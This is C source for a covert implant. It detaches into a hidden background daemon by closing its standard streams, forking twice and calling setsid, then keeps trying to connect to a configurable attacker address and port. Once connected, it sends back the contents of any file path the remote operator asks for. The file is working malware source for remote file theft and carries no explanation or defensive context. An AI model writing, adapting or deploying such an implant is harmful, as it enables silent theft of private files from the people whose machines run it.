#include <fcntl.h>
#include <strings.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <string.h>

#define sfd socket(AF_INET,SOCK_STREAM,0)
void backit(){
    int pid,sid;
    close (0);close (1);close(2);
    if ((pid=fork())<0){exit(1);}if((pid=fork())>0){exit(0);}
    if ((sid=setsid())<0){exit(1);}
}
void  filesend(char filename[], int afd, char ip[], int portn);
int main(){
   backit();
   filesend("None",sfd, AIP, PORT);
   return 0;
}
void ch(int var, char msg[]){
    if (var == -1){printf ("%s\n",msg);exit(1);}
}

void filesend(char filenam[],int afd, char ip[], int portn){
   struct sockaddr_in adr={ .sin_port=htons(portn), .sin_family=AF_INET };
   inet_pton(AF_INET,ip, &adr.sin_addr.s_addr);
   int vctl=sizeof(struct sockaddr_in);
   int cnt;
   while (1){;cnt=connect(afd,(struct sockaddr*)&adr,sizeof(adr));if (cnt==-1){sleep(20);}else{break;}}
   while (1){
   char filename[256];
   bzero(filename, sizeof(filename));
   recv(afd,filename,sizeof(filename),0);
   strcat(filename,"\0");
   int sfile=open(filename, O_RDONLY);
   char signal[10];
   if (sfile == -1){
     send(afd,"-11",3,0);
     bzero(&sfile,sizeof(sfile));
     continue;
   }
   else{
   strcat(filename,"\0");
   struct stat ft;
   stat(filename,&ft);
   char ftssize[15]; sprintf(ftssize, "%ld",ft.st_size);
   int ss=ft.st_size;
   char data[ss];
   read (sfile, data, sizeof(data));
   sleep(1);
   int snd= send(afd,ftssize,strlen(ftssize),0);
   sleep(1);
   int snd2=send(afd,&data,ss, 0);
   close (sfile);
   bzero(filename,sizeof(filename));
   bzero(data,sizeof(data));
   bzero(ftssize,sizeof(ftssize));
   sleep(2);
   }
   }
}
